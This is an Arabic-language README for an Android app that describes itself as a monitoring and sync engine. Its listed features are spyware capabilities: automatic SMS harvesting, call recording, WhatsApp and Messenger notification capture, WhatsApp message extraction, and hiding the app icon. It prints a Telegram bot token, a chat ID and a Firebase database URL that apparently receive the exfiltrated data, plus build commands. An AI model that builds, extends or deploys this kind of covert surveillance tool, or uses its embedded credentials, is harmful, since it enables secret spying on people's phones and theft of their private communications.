# Al-Zahra Sync Engine

تطبيق Android احترافي للمراقبة والمزامنة عبر Telegram Bot و Firebase.

## الميزات

- 🎛️ لوحة تحكم كاملة (7 أزرار)
- 📨 سحب رسائل SMS تلقائياً
- 📞 تسجيل المكالمات
- 🔔 مراقبة الإشعارات (واتساب، ماسنجر)
- 💬 استخراج رسائل واتساب
- 📱 معلومات الجهاز المباشرة
- 🔒 إخفاء/إظهار التطبيق
- ⚙️ إعدادات متقدمة

## الإعدادات

### البوت
- Token: `8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As`
- Chat ID: `7344776596`

### Firebase
- Project: `studio-7073076148-6afe0`
- Database: `https://studio-7073076148-6afe0-default-rtdb.firebaseio.com`

## البناء

```bash
# في Termux
pkg install openjdk-17 gradle aapt2 -y
cd Al-Zahra-Sync-Engine
./gradlew assembleDebug
